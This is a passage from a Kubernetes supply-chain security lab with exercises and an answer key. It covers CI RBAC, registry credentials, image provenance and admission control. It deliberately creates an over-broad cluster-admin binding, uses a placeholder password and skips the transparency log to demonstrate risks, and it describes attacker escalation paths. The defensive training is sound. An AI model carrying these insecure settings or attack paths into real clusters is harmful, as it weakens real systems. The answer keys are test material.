**Objective:** treat the pipeline as a production system with an identity, a blast radius, and secrets — because it is the highest-value target in the whole chain.

1. Statically analyse manifests before they are ever applied.

```bash
cd ~/sc-lab/app
trivy config --severity HIGH,CRITICAL --exit-code 1 ./tagged.yaml
```

```text
tagged.yaml (kubernetes)
HIGH: Container 'app' of Deployment 'healthz' should set 'securityContext.runAsNonRoot' to true
HIGH: Container 'app' of Deployment 'healthz' should set 'securityContext.readOnlyRootFilesystem' to true
CRITICAL: Container 'app' of Deployment 'healthz' should not set 'allowPrivilegeEscalation' implicitly
```

2. Score with `kubesec` for a complementary opinion.

```bash
kubesec scan tagged.yaml | jq '.[0] | {score, advise: (.scoring.advise | map(.selector))}'
```

3. Analyse the Dockerfile itself for build-time misconfiguration.

```bash
trivy config Dockerfile.fat
```

4. Scan the repository for leaked credentials — pipelines commit them constantly.

```bash
trivy fs --scanners secret,vuln,misconfig --severity HIGH,CRITICAL .
```

5. Audit the identity your CI job holds inside the cluster. This is the step most teams never do.

```bash
kubectl create ns ci
kubectl -n ci create serviceaccount deployer
kubectl create clusterrolebinding ci-deployer-toowide \
  --clusterrole=cluster-admin --serviceaccount=ci:deployer

# What can this token actually do?
kubectl auth can-i --list --as=system:serviceaccount:ci:deployer | head
kubectl auth can-i create pods --as=system:serviceaccount:ci:deployer -n kube-system
kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:ci:deployer
```

6. Replace it with a least-privilege binding scoped to one namespace and one verb set.

```bash
kubectl delete clusterrolebinding ci-deployer-toowide

cat > ci-rbac.yaml <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: supply
  name: deployer
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "patch", "update"]
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: supply
  name: deployer
subjects:
- kind: ServiceAccount
  name: deployer
  namespace: ci
roleRef:
  kind: Role
  name: deployer
  apiGroup: rbac.authorization.k8s.io
EOF
kubectl apply -f ci-rbac.yaml

kubectl auth can-i create pods --as=system:serviceaccount:ci:deployer -n supply
kubectl auth can-i patch deployments --as=system:serviceaccount:ci:deployer -n supply
```

7. Issue a short-lived token instead of a long-lived Secret.

```bash
TOKEN=$(kubectl -n ci create token deployer --duration=10m)
kubectl -n ci get secrets | grep deployer || echo "no long-lived Secret exists — correct"
```

8. Review the pipeline definition against the classic injection sinks.

```yaml
# .github/workflows/release.yaml — annotated with the controls that matter
name: release
on:
  push:
    tags: ["v*"]

permissions:
  contents: read          # default-deny; widen per job, never at workflow level
  id-token: write         # OIDC for keyless signing — no static key material
  packages: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Pin actions by COMMIT SHA, not by tag. A tag on a third-party action
      # is mutable by its owner — the same attack as Exercise 4, one layer up.
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false   # do not leave a push-capable token in .git/config

      - uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0
        id: build
        with:
          push: true
          provenance: mode=max
          sbom: true

      # Sign the DIGEST that build-push-action reported, not the tag we asked for.
      - run: cosign sign --yes ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}

      - run: |
          syft scan ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }} \
            -o spdx-json=sbom.spdx.json
          grype sbom:./sbom.spdx.json --only-fixed --fail-on high
          cosign attest --yes --predicate sbom.spdx.json --type spdxjson \
            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
```

### Verification questions — block 9

- **Q9.1** The workflow pins third-party actions by commit SHA. Which exercise in this document is the direct analogue of that control, and what is the shared underlying principle?
- **Q9.2** `persist-credentials: false` was set on checkout. What specific escalation does that prevent, given that the job also runs `docker build` on attacker-influenced files?
- **Q9.3** The pipeline signs `steps.build.outputs.digest` rather than the tag it pushed. Construct the race condition that signing the tag would expose you to.
- **Q9.4** In step 5 the CI ServiceAccount was `cluster-admin` in one namespace-scoped pipeline. Enumerate the path from "attacker submits a pull request" to "attacker owns the cluster", assuming PR builds share that ServiceAccount.
- **Q9.5** Short-lived tokens (`kubectl create token --duration=10m`) versus a `kubernetes.io/service-account-token` Secret: state the two properties the short-lived token gains, and the one operational thing it breaks.

---

## Exercise 10 — Artifact repository hardening and pull-path control

**Objective:** control how the cluster authenticates to registries and what it is permitted to pull.

1. Create a namespaced pull secret and attach it to a ServiceAccount, so pods do not each carry credentials.

```bash
kubectl -n supply create secret docker-registry regcred \
  --docker-server=registry.internal.example.com \
  --docker-username=ci-pull \
  --docker-password='S3cr3t!' \
  --docker-email=platform@example.com

kubectl -n supply patch serviceaccount default \
  -p '{"imagePullSecrets":[{"name":"regcred"}]}'

kubectl -n supply get sa default -o jsonpath='{.imagePullSecrets}{"\n"}'
```

2. Confirm the credential is recoverable by anyone with `get secrets` in that namespace — this is why registry credentials must be pull-only.

```bash
kubectl -n supply get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq
```

```text
{ "auths": { "registry.internal.example.com": { "username": "ci-pull", "password": "S3cr3t!", "auth": "..." } } }
```

3. Enable `AlwaysPullImages` so that a pod cannot reuse a private image already cached on the node without proving it can authenticate.

```yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
- --enable-admission-plugins=NodeRestriction,AlwaysPullImages
```

4. Verify the effect: the plugin rewrites the field regardless of what the author asked for.

```bash
kubectl -n supply run cachetest --image=$REG/healthz:slim --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"cachetest","image":"localhost:5000/healthz:slim","imagePullPolicy":"IfNotPresent"}]}}'
kubectl -n supply get pod cachetest -o jsonpath='{.spec.containers[0].imagePullPolicy}{"\n"}'
```

```text
Always
```

5. Enumerate every distinct image running in the cluster, and every registry it comes from — the inventory an incident starts with.

```bash
kubectl get pods -A -o jsonpath='{range .items[*]}{range .status.containerStatuses[*]}{.imageID}{"\n"}{end}{end}' \
  | grep -v '^$' | sort -u

kubectl get pods -A -o jsonpath='{range .items[*].spec.containers[*]}{.image}{"\n"}{end}' \
  | awk -F/ '{ if ($0 ~ /\//) print $1; else print "docker.io (implicit)" }' | sort | uniq -c | sort -rn
```

```text
     41 registry.k8s.io
      7 localhost:5000
      3 docker.io (implicit)
      1 quay.io
```

6. Registry-side controls to configure in Harbor / Artifactory / ECR (verify in your own registry's UI or API):

```text
  IMMUTABLE TAG RULES     tag `v*` in project `prod` cannot be overwritten  -> kills Exercise 4's attack
  VULNERABILITY GATE      block pull if severity >= High and scan is stale  -> policy at the pull, not the push
  CONTENT TRUST           reject unsigned artifacts on push
  PROXY CACHE             one egress path to docker.io; nodes never reach the internet directly
  RETENTION + QUOTA       old digests garbage-collected on a schedule
  ROBOT ACCOUNTS          push identity != pull identity; pull is read-only, scoped to one project
```

7. Confirm nodes cannot bypass the internal registry.

```bash
kubectl -n supply run egress --image=$IMG --restart=Never --rm -it --command -- /healthz &
# From the node:
sudo crictl pull docker.io/library/nginx:1.27 || echo "direct egress blocked -> correct"
```

### Verification questions — block 10

- **Q10.1** The `regcred` Secret is readable by every subject with `get secrets` in `supply`. Describe the exact damage a leaked *push*-capable credential does, versus a leaked pull-only one.
- **Q10.2** `AlwaysPullImages` was enabled. What attack does it stop, and what two operational costs does it impose?
- **Q10.3** Step 5 counted 3 images from "docker.io (implicit)". Why is an unqualified image name such as `nginx:1.27` a supply-chain risk beyond just registry choice?
- **Q10.4** Immutable tag rules and digest pinning both defeat tag mutation. Why implement both, and which one protects you when a developer bypasses the pipeline?
- **Q10.5** A proxy cache registry means every node pulls only from `registry.internal.example.com`. What new single point of compromise did you just create, and what compensating control keeps it honest?

---

## Exercise 11 — Trace a running container back to its source

**Objective:** perform the end-to-end walk an incident responder does. This is the exam of the whole topic.

1. Start from a running pod. Get the resolved digest, not the tag.

```bash
kubectl -n supply get pod signed \
  -o jsonpath='{.status.containerStatuses[0].imageID}{"\n"}'
```

```text
localhost:5000/healthz@sha256:4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281
```

2. Ask the registry what that digest is.

```bash
crane manifest $IMG | jq '{schemaVersion, layers: (.layers|length), config: .config.digest}'
crane config $IMG | jq '{created, architecture, config: .config.Entrypoint, history: (.history|length)}'
```

3. Recover the build provenance from the config labels or the attestation.

```bash
crane config $IMG | jq '.config.Labels'
cosign verify-attestation --key cosign.pub --insecure-ignore-tlog=true \
  --type slsaprovenance $IMG 2>/dev/null \
  | jq -r '.payload' | base64 -d \
  | jq '.predicate | {builder: .builder.id, source: .invocation.configSource}'
```

4. Recover the inventory as of build time.

```bash
cosign verify-attestation --key cosign.pub --insecure-ignore-tlog=true \
  --type spdxjson $IMG | jq -r '.payload' | base64 -d \
  | jq -r '.predicate.packages[] | "\(.name)\t\(.versionInfo)"'
```

5. Ask today's question against yesterday's inventory.

```bash
cosign verify-attestation --key cosign.pub --insecure-ignore-tlog=true \
  --type spdxjson $IMG | jq -r '.payload' | base64 -d | jq '.predicate' > shipped-sbom.json
grype db update
grype sbom:./shipped-sbom.json --only-fixed -o table
```

6. Find every workload in the cluster affected by the same digest.

```bash
kubectl get pods -A -o json | jq -r --arg D "$IMG_DIGEST" '
  .items[] | select(
    (.status.containerStatuses // [])[]? | .imageID | contains($D)
  ) | "\(.metadata.namespace)/\(.metadata.name)"'
```

7. Write the incident timeline you can now defend.

```text
  DIGEST      sha256:4d1e2b7c...        <- what is running, verified against the kubelet
  SIGNATURE   valid, key platform-2026  <- who approved it
  PROVENANCE  builder github/acme, ref refs/tags/v1.4.2, commit 9a1c7f0
  SBOM        5 packages, signed, subject == digest
  EXPOSURE    stdlib go1.22.5 -> CVE-2024-xxxxx (fixed in 1.22.7)
  BLAST       supply/signed, supply/healthz-6b4f9c7d5-p8m2r  (2 pods, 1 namespace)
  ACTION      rebuild from 9a1c7f0 on go1.22.7, re-sign, re-attest, patch digest
```

### Verification questions — block 11

- **Q11.1** At step 1 you read `.status.containerStatuses[].imageID` rather than `.spec.containers[].image`. If the two disagree, which one do you trust for incident response and why?
- **Q11.2** Step 5 scanned the *shipped* SBOM rather than re-scanning the live image. Name one advantage and one serious limitation of that approach.
- **Q11.3** The provenance says `commit 9a1c7f0`. What additional control must exist for that claim to be worth anything?
- **Q11.4** Suppose step 3 returns no attestation at all, and step 1's digest is not in any registry you control. What has almost certainly happened, and which of the earlier exercises' controls would have prevented it?

---

<details>
<summary><strong>Answers</strong></summary>

### Block 1 — image minimization

**A1.1** Three distinct capabilities the `fat` image grants and `slim` denies:
1. **Interactive reconnaissance and lateral movement** — a shell plus `curl`/`wget` lets the attacker enumerate the pod network, hit the API server at `https://kubernetes.default.svc`, read `/var/run/secrets/kubernetes.io/serviceaccount/token`, and pivot. With distroless there is no `sh`, no `curl`, no `cat`; the attacker must bring their own tooling and must already have a write+exec-capable path.
2. **In-place compilation and toolchain abuse** — the Go toolchain, `gcc` and `git` mean an attacker can build a second-stage payload on the host, avoiding any network-based download that egress policy or an IDS would catch.
3. **Package installation** — `apt-get install` gives an attacker a package manager with root-equivalent capabilities inside the container, an enormous ready-made arsenal, and a plausible-looking mechanism that blends into normal operational noise.

**A1.2** `CGO_ENABLED=0` produces a **statically linked** binary with no dynamic dependency on `glibc`, `libpthread` or the NSS resolver libraries. `distroless/static` contains only CA certificates, `/etc/passwd`, `tzdata` and a `nonroot` user — no libc at all — so a CGO-enabled binary would fail at exec with a missing-interpreter error. `distroless/base` ships glibc precisely for CGO builds, at the cost of a larger surface (glibc is a recurring CVE source). Choose `static` whenever you can; choose `base` only when CGO is genuinely required (e.g. certain SQLite or DNS-resolver configurations).

**A1.3** The counter-argument: minimization is not a boundary, it is **cost imposition and detectability**. Uploading busybox requires the attacker to already have (a) a writable filesystem location, (b) that location mounted without `noexec`, and (c) either egress to fetch it or a way to write it through the existing exploit primitive. Every one of those steps is a new, noisy, detectable action, and each is independently blockable.

The Kubernetes-level control that makes the objection genuinely weak is `securityContext.readOnlyRootFilesystem: true` combined with `allowPrivilegeEscalation: false` and dropping all capabilities — with a read-only root and `emptyDir` volumes mounted `noexec`, there is no place to land the binary at all. Minimization plus a read-only root is far stronger than either alone.

**A1.4** They do **not** appear in the `slim` SBOM, and they do **not** matter for runtime exposure — the build stage is discarded and no byte of the Go toolchain is in the shipped image. This is the whole point of multi-stage builds. Two caveats worth stating: (i) build-stage CVEs still matter for **build integrity** — a compromised toolchain can inject a backdoor into the output binary (the classic Ken Thompson / "trusting trust" concern, and the practical reason SLSA cares about hermetic, provenance-attested builders); (ii) if a vulnerable *library* was statically linked into the binary, the CVE travels into the runtime image even though the *package* does not appear as a deb — which is exactly the cataloguing blind spot from Exercise 2.

---

### Block 2 — SBOM generation

**A2.1** The **subject digest** — the cryptographic identifier of the artifact the document describes (`.metadata.component.hashes` in CycloneDX, the document `name`/`DESCRIBES` relationship and package checksums in SPDX; and in an in-toto attestation, `subject[].digest.sha256`). Without it, the SBOM is a list of package names attached to nothing: it cannot be verified against any image, it can be swapped for another image's SBOM, and it degrades into documentation. Everything downstream — signing, admission policy, incident response — keys off that binding.

**A2.2** Neither is "right"; they use different **catalogers** and different assumptions. Syft enumerates package databases and language manifests aggressively across many ecosystems; Trivy applies its own analyzers and is tuned toward what its vulnerability database can match. Differences arise from: which package types each tool catalogues by default, how each handles Go build info embedded in binaries, whether files with no package metadata are reported, and version-normalization choices.

The lesson for policy: **do not treat an SBOM as ground truth about what is in an image** — treat it as one tool's best evidence. Concretely: pin the generator and its version in the pipeline (an SBOM is only comparable to another SBOM from the same tool+version), record the generator in `creationInfo`/`metadata.tools`, and if a policy decision must be defensible, generate with two tools and alert on divergence rather than silently trusting one.

**A2.3** The class of attack is **dependency injection outside the package-manager plane** — a vendored binary, a statically linked library, a `curl | sh` install in the Dockerfile, a JAR shaded into an uber-JAR, or a malicious file copied in via `COPY`. Because no package database records it, the SBOM lists nothing, the scanner has nothing to match, and the pipeline reports "0 vulnerabilities" on an image containing a known-vulnerable or outright malicious binary. This is how Log4Shell hid inside shaded JARs in many organizations.

Two ways to close it:
1. **Enable file/binary-level catalogers** (`syft --select-catalogers '+binary-classifier-cataloger'`, or Trivy's `--scanners vuln` with its binary analyzers), so version strings embedded in executables are detected.
2. **Constrain the build itself**: forbid `curl|sh` and unpinned `COPY` from arbitrary sources in Dockerfile linting, require all runtime content to come from a package manager or a `COPY --from` of an attested build stage, and use hermetic builds where the builder has no network access after dependency resolution. Complement with **filesystem diffing** — compare the image's file inventory against the union of files claimed by catalogued packages, and alert on the remainder.

**A2.4** Scanning `registry:$IMG` scans **exactly the bytes the cluster will pull**, resolved by digest, with no dependency on local daemon state. The `docker:` source scans whatever the local daemon has under that tag, which may be stale, may have been built with a different `--build-arg`, may have been locally `docker tag`'d by another job on a shared runner, and is not digest-addressed. In CI on shared or long-lived runners, the daemon's image cache is attacker-influenceable state; the registry digest is not. It also means the same SBOM job can run on a machine that never had build access at all — a cleaner privilege separation.

**A2.5** **SPDX** for license compliance: it was designed by the Linux Foundation for exactly that, has the richest license-expression model (`licenseConcluded` vs `licenseDeclared`, SPDX license identifiers as the industry vocabulary), and is the format legal and procurement teams and the ISO 5962 standard expect.

**CycloneDX** for VEX-driven vulnerability triage: it was designed by OWASP with security as the primary use case, models component relationships and `pedigree` well, has first-class **PURL** identifiers that map cleanly onto vulnerability databases, and — decisively — has a native, integrated VEX representation so exploitability statements live in the same schema family as the inventory.

In practice mature pipelines emit both; they are cheap to generate and different consumers want different formats.

---

### Block 3 — consuming the SBOM

**A3.1** Two independent reasons:
1. **Different inventory.** The SBOM was generated once, by one tool, with one cataloger configuration. `grype registry:` re-catalogues the image at scan time — possibly with a newer Grype containing new or improved catalogers, so it may see packages the stored SBOM never recorded (and vice versa if catalogers were removed).
2. **Different vulnerability database snapshot.** Grype matches against a database that updates continuously. Even with identical inventories, a scan today and a scan an hour ago can differ because a CVE was published, a severity was rescored, or a fix version was added. (A third, subtler reason: `registry:` may resolve a *tag* to a different digest than the SBOM's subject — the Exercise 4 problem.)

**A3.2** It degrades into a rubber stamp because the count is **unbounded, non-actionable, and not under the developer's control**. A base image with 1200 packages will accumulate criticals continuously; most will have no fix available; most of those that do will be in code paths the application never executes. The team's only options become "block all releases indefinitely" or "add a blanket ignore" — and under deadline pressure, it is always the second. The gate then permits everything, while the dashboard implies it permits nothing.

A gate that survives contact with reality has four properties:
- **Fixable only** — `--only-fixed`: fail only where the developer can actually act (`grype sbom:... --only-fixed --fail-on high`).
- **Bounded by reachability** — suppress with VEX statements backed by analysis, not with blanket ignores.
- **No regression, plus a decreasing budget** — fail on any *new* finding relative to the previous release, and separately track an absolute count with a scheduled ratchet, so inherited debt does not block today's release but does not become permanent either.
- **Time-boxed exceptions** — every suppression carries an owner and an expiry date, and expiry re-breaks the build.

Crucially, the gate should also fail on things that are *always* actionable and *always* the developer's fault: leaked secrets, `latest` tags, unpinned base images.

**A3.3** `.trivyignore` asserts nothing. It is `"do not tell me about this ID"` — an unattributed, undated, unjustified, unsigned line in a text file. It suppresses the finding for everyone, forever, on every image, with no record of who decided or why.

The OpenVEX `not_affected` / `vulnerable_code_not_in_execute_path` statement asserts a **specific, attributed, timestamped, product-scoped claim**: *this author, on this date, analysed this CVE against this exact product (identified by PURL/digest) and determined the vulnerable code is present but not reachable.*

Why an auditor cares: the VEX statement is **evidence of a security process**. It is scoped to one digest (it does not silently carry forward to a rebuild where the code path *did* become reachable), it names a responsible party, it states a machine-readable justification from a fixed vocabulary, it can be signed and distributed to downstream consumers, and it can be reviewed and revoked. `.trivyignore` is indistinguishable from "someone wanted the build to go green."

**A3.4** The SBOM does **not** need regenerating — the image did not change, so the inventory did not change. Regenerating it would produce the same content with a new timestamp and would tell you nothing.

What needs re-running is the **matching step**: the vulnerability scan of the stored SBOM against a current database. This is the central operational argument for storing SBOMs as attestations: you can re-answer "am I exposed?" for every image you have ever shipped, in seconds, without rebuilding anything and without pulling images.

Where it should run: **continuously, outside the build pipeline**, in a service that holds an inventory of every artifact currently deployed (correlated with the cluster's actual running digests, per Exercise 11 step 6) and re-scans all their SBOMs on every database update. A gate that only runs at build time answers "was this safe when we shipped it?", which is not the question anyone asks during an incident.

---

### Block 4 — tags vs digests

**A4.1** `.status.containerStatuses[].imageID` — the digest the kubelet actually resolved and ran. `spec.containers[].image` is a **request**, not a fact: it records what the author asked for, and when it holds a mutable tag it is a pointer whose target can change at any time without any Kubernetes object being modified. For audit you need the value that identifies bytes, and only the digest does. This is also why `kubectl diff`, GitOps drift detection and admission webhooks that only read the spec can all report "no change" across a complete code substitution.

**A4.2** With `IfNotPresent`, the kubelet runs whatever is in the **node's local image cache** under that tag; it only contacts the registry if nothing is cached. So the deciding factor is simply *whether that node ever pulled the tag before* — which depends on scheduling history, node age, whether the node was recently added or reimaged, and garbage-collection pressure from `--image-gc-high-threshold`.

The security consequence: **the same Deployment runs different code on different nodes, indefinitely and invisibly.** A rollback that "fixes" the problem on new nodes leaves compromised nodes serving the malicious image; scaling up may or may not spread it; and no Kubernetes object reflects the split. Incident scoping becomes a per-node investigation instead of a query. (`AlwaysPullImages`, Exercise 10, forces determinism here.)

**A4.3** **Yes, the container starts.** Without `AlwaysPullImages`, `imagePullPolicy: IfNotPresent` means the kubelet finds the image locally and never contacts the registry, so no credential is ever required. This is a real, frequently overlooked isolation failure: a tenant in namespace B can run a private image belonging to tenant A merely by naming it, provided A's pod happened to be scheduled on the same node — image caches are node-scoped, not namespace-scoped.

The plugin that changes the answer is **`AlwaysPullImages`**. Enabled on the API server, it mutates every pod's `imagePullPolicy` to `Always` at admission, forcing the kubelet to contact the registry on every container start. The pull then fails with an auth error unless the pod's namespace has a working `imagePullSecret`, restoring registry credentials as an actual authorization boundary.

**A4.4** The operational cost is that **the manifest no longer expresses intent** — `image: healthz@sha256:4d1e...` is unreadable, and every upgrade (including automated base-image patching) requires rewriting the manifest, so digest pinning is incompatible with hand-maintained YAML at scale.

The pipeline component that absorbs it is the **image updater / release automation**: a GitOps controller such as Flux's image-automation controllers, Argo CD Image Updater, or Renovate/Dependabot, which watches the registry for a new digest matching a tag policy, opens a commit or PR that rewrites the digest in Git, and lets the normal review-and-deploy path apply it. The digest stays authoritative; the tag becomes an input to automation rather than a runtime indirection. An admission-time alternative is Kyverno's `mutateDigest: true` (Exercise 8), which resolves and rewrites the digest at admission after verifying the signature.

---

### Block 5 — signing and attestation

**A5.1** The signature is stored as a **separate OCI artifact in the same repository**, under a derived tag `sha256-<digest>.sig` (as `cosign triangulate` showed), containing a small manifest whose layer holds the signature payload and whose annotations hold the signature itself. Modern cosign can also use OCI 1.1 referrers.

The implication for `crane copy`: a plain copy of `repo:tag` moves the image manifest and layers but **not** the associated `.sig`/`.att` artifacts, because they are separate objects under different tags. The image arrives at the destination registry unverifiable, and any admission policy requiring a signature will reject it. You must copy the signatures too — `cosign copy $SRC $DST`, `crane copy` of the `.sig` tags explicitly, or a registry replication rule that understands cosign/referrer artifacts. Silent signature loss during registry migration or promotion between environments is one of the most common causes of "the policy suddenly rejects our production images."

**A5.2** With **key-based** signing, trust is anchored in possession of a private key. The key must exist somewhere — a KMS, a CI secret, a file — for the entire lifetime of the signing identity, and anyone who obtains it can forge signatures indefinitely and undetectably, including retroactively.

With **keyless** signing, there is no long-lived key. The signer proves an **identity** to an OIDC provider (e.g. GitHub Actions' workload identity), Fulcio issues a certificate valid for ~10 minutes binding a freshly generated ephemeral key to that identity, the artifact is signed, the ephemeral private key is discarded, and the certificate plus signature are recorded in the Rekor transparency log. Verification pins the *identity and issuer* (`--certificate-identity-regexp`, `--certificate-oidc-issuer`), not a key.

Keyless is dramatically harder for an attacker who steals a runner's disk: there is no key at rest to steal. The credential is an OIDC token bound to a specific workflow, repository and ref, it expires in minutes, and it cannot be exfiltrated for later reuse. Compromising it requires **live code execution inside the legitimate workflow at signing time** — and even then, every signature produced is permanently logged in Rekor with the identity that made it, so the abuse is discoverable after the fact. Key theft is silent; keyless abuse leaves a public record.

**A5.3** The `subject[].digest.sha256` field of the in-toto statement. `cosign attest` wraps the predicate (your SBOM) in an in-toto Statement whose `subject` is the digest of the image being attested, then signs the whole envelope. Verifying against `$FAT` fails because no attestation exists whose subject matches that digest and whose signature validates under the given key.

The attack it prevents is **SBOM/attestation transplantation**: taking the clean, low-CVE SBOM of an audited image and presenting it as the SBOM of a different, malicious image. Without the subject binding, an SBOM is a detached text file that can be attached to anything; with it, the claim "this inventory describes this artifact" is cryptographically inseparable from the artifact's identity.

**A5.4** **Rekor** is an append-only, publicly auditable transparency log of signing events. It protects primarily against **undetectable key compromise and backdating**. Because every legitimate signature is logged, a signature produced with a stolen key is either absent from the log (and rejected by verifiers that require log inclusion) or present in it — where the artifact owner can see a signing event they did not perform. It also provides **long-term verifiability of short-lived certificates**: Fulcio certs live ~10 minutes, so without a timestamped log entry proving the signature was made while the cert was valid, keyless signatures would become unverifiable minutes after creation.

Disabling it with `--insecure-ignore-tlog=true` loses: detection of unauthorized signing, the trusted timestamp, the ability to reason about revocation windows, and (for keyless) verifiability past certificate expiry. It is acceptable in an air-gapped lab against a local registry — as here — and in environments running a private Rekor instance, but it should never be the production posture. Note that a private Rekor is the standard answer for regulated or air-gapped environments; "no log" is not.

**A5.5** A valid signature does not answer:
- **What is in the artifact.** The signer may have signed a backdoored image, either maliciously or because their build was compromised. A signature is an assertion of approval, not of contents or quality — which is exactly why you attach an SBOM *and* provenance attestation alongside it, and why admission policy should verify those predicates too, not just the signature.
- **Whether the artifact should still be trusted today.** Signatures do not expire in any useful operational sense and there is no widely deployed revocation mechanism for them. An image signed legitimately six months ago, now known to contain a critical RCE or known to have been produced by a compromised builder, still verifies perfectly. Freshness and revocation must come from elsewhere — continuous re-scanning of stored SBOMs (A3.4), an allow-list of currently approved digests, or a policy requiring a recent, signed "still approved" attestation.

(Other valid answers: it does not tell you the *source* the artifact was built from — that is the provenance predicate — nor whether the signing identity was authorized to sign *this particular* artifact, which is a policy question about identity-to-repository mapping.)

---

### Block 6 — ImagePolicyWebhook

**A6.1** The most likely cause is that the **config file is not visible inside the API server container**: the `hostPath` volume and `volumeMount` for `/etc/kubernetes/admission` were not added, or were added under a path that does not match the `--admission-control-config-file` value. `kube-apiserver` runs as a static pod; a file on the node's filesystem does not exist in its mount namespace unless mounted. (A close second: `kubeConfigFile` inside `admission-config.yaml` points to a path that is likewise not mounted, or the whole plugin block references the wrong plugin name.)

Confirm in ten seconds:
```bash
kubectl -n kube-system exec -it kube-apiserver-$(hostname) -- ls -l /etc/kubernetes/admission/
# or, if the API server is unhealthy:
sudo crictl ps -a --name kube-apiserver
sudo crictl logs <container-id> 2>&1 | tail -20
```
If the API server started *successfully* with the flag but the webhook is never called, the most common remaining cause is that the file was mounted read-only from a path that did not exist at kubelet start, so `DirectoryOrCreate` produced an empty directory — `ls` shows it immediately. Note also that a genuinely malformed config normally makes the API server refuse to start, which is a different symptom (A6.3).

**A6.2** The failure sequence: the webhook backend is itself a workload. Suppose it runs in-cluster and the cluster reboots, or its node fails, or its Deployment is scaled to zero during maintenance, or a network policy change severs the API server's path to it. Now **no pod can be created anywhere** — including the webhook's own pods, so it can never come back. The cluster is deadlocked and recovery requires editing the static pod manifest on the control plane node by hand, exactly as in step 8. The same happens on a cold start: nothing can schedule until the webhook is up, and the webhook cannot come up until something can schedule.

Mitigations that keep fail-closed semantics without the risk:
- **Never run the backend in the cluster it guards**, or run it as a static pod / host-network DaemonSet on control plane nodes with no dependency on cluster scheduling.
- **Exempt system namespaces**, so `kube-system` and the CNI/CSI/webhook workloads bypass the check. (`ImagePolicyWebhook` itself has no namespace exemption field — one of its real limitations — which is a strong argument for the `ValidatingWebhookConfiguration`/`ValidatingAdmissionPolicy` route, where `namespaceSelector`/`objectSelector` exemptions are first-class.)
- **Run the backend highly available** with multiple replicas, pod anti-affinity, a PDB, and generous `allowTTL` caching so brief outages are absorbed by cached decisions.
- **Rehearse the break-glass procedure**: a documented, tested path to remove the flag from the static pod manifest, with the backup taken *before* the change (step 1).

**A6.3** `kubectl` is unavailable because the API server is the thing that is down, so you must go under it, on the control plane node:

```bash
# 1. Is the container even being created? The kubelet retries static pods continuously.
sudo crictl ps -a --name kube-apiserver
sudo crictl logs $(sudo crictl ps -a --name kube-apiserver -q | head -1) 2>&1 | tail -40

# 2. The kubelet's own view — YAML parse errors in the manifest show up here.
sudo journalctl -u kubelet -n 100 --no-pager | grep -iE 'apiserver|static|manifest|error'

# 3. Container-runtime-level logs if crictl shows nothing.
sudo ls -lt /var/log/pods/kube-system_kube-apiserver-*/kube-apiserver/
sudo tail -40 /var/log/pods/kube-system_kube-apiserver-*/kube-apiserver/*.log

# 4. Recovery.
sudo cp /root/kube-apiserver.yaml.bak /etc/kubernetes/manifests/kube-apiserver.yaml
```

Two distinct symptoms to distinguish: if `crictl ps -a` shows a container in `Exited` with a config error in its logs, the flags or the config file are wrong. If `crictl ps -a` shows **no container at all**, the kubelet could not parse the static pod manifest itself (bad YAML indentation from your edit) — and that error appears only in `journalctl -u kubelet`.

**A6.4** The API server forwards any pod annotation with the `*.image-policy.k8s.io/*` prefix to the backend in `ImageReview.spec.annotations`, and the backend is free to act on it. The overwhelmingly common backend implementation treats a break-glass annotation as "allow this image despite policy" so that operators can ship during an incident.

The escalation risk: **the API server does not gate who may set that annotation.** Any subject who can create a pod in any namespace can add the annotation and thereby bypass the entire image policy — turning a cluster-wide security control into an opt-out that every developer holds. Worse, it is invisible in RBAC: `can-i create pods` does not read as "can bypass image policy."

Containment:
- **Do not implement break-glass in the backend at all** if you can avoid it; make the exception path a change to the backend's own allow-list, which is separately audited.
- If you must have it, **gate the annotation with a second admission control** — a `ValidatingAdmissionPolicy` or webhook that denies any pod carrying an `*.image-policy.k8s.io/*` annotation unless the requesting user (`request.userInfo`) is in an explicit break-glass group, evaluated *before* the policy is bypassed.
- **Require a correlating value** (an incident ticket ID) that the backend validates against the ticketing system, and **alert loudly and immediately** on every use — a break-glass that fires silently is just a bypass.
- **Expire it**: make the backend accept the annotation only during a declared maintenance window.

**A6.5** Two reasons to prefer a `ValidatingWebhookConfiguration`-based controller (Kyverno, Gatekeeper, sigstore policy-controller):
1. **Expressiveness and object scope.** `ImageReview` gives the backend only a list of image strings, the namespace, and annotations. It cannot see the pod's `securityContext`, labels, the requesting user, the owning controller, or anything else — so it cannot express "images from registry X only in namespace Y", "team A may deploy only their own repository", or any rule combining image with pod configuration. A validating webhook receives the full `AdmissionReview` with the complete object and `userInfo`.
2. **Operational safety and lifecycle.** `ValidatingWebhookConfiguration` is an API object: it supports `namespaceSelector` and `objectSelector` exemptions, per-webhook `failurePolicy`, `timeoutSeconds`, and `matchPolicy`, and it can be created, modified and deleted with `kubectl` at runtime by any cluster admin. `ImagePolicyWebhook` is configured by a file on the control plane node's disk plus API server flags — every change requires node access and an API server restart, it cannot be adjusted during an incident from outside the node, and it has no exemption mechanism at all. It is also still `v1alpha1` after many releases, with no mutation capability (so it cannot resolve tags to digests, cf. A8.1).

One reason it is still worth knowing: **it is on the CKS exam**, and the exam tests exactly this — editing `/etc/kubernetes/manifests/kube-apiserver.yaml` to add `--enable-admission-plugins`, `--admission-control-config-file`, and the corresponding `volume`/`volumeMount`, then recovering the API server. Beyond the exam, it is the only image-policy mechanism that requires no in-cluster component, which occasionally matters for tightly controlled or air-gapped control planes.

---

### Block 7 — ValidatingAdmissionPolicy

